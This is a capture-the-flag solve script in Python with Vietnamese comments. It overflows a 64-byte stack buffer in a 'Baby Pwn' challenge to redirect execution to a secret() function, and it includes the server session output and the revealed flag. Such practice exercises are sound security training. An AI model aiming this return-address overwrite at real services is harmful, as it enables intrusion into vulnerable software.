from pwn import *

# Địa chỉ của hàm secret() (lấy từ output của chương trình)
secret_addr = 0x401166

# Tìm offset: Buffer có kích thước 64 bytes + 8 bytes cho saved RBP
offset = 64 + 8

# Tạo payload: Padding + địa chỉ của hàm secret()
payload = b"A" * offset + p64(secret_addr)

# Kết nối tới server qua netcat
io = remote("34.162.142.123", 5000)

# Đọc banner và địa chỉ của hàm secret()
print(io.recvuntil(b"Enter some text: "))

# Gửi payload
io.sendline(payload)

# Nhận flag
io.interactive()


# [+] Opening connection to 34.162.142.123 on port 5000: Done
# b'Welcome to the Baby Pwn challenge!\nAddress of secret: 0x401166\nEnter some text: '
# [*] Switching to interactive mode
# You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf\x11@
# Congratulations! Here is your flag: uoftctf{buff3r_0v3rfl0w5_4r3_51mp13_1f_y0u_kn0w_h0w_t0_d0_1t}
# [*] Got EOF while reading in interactive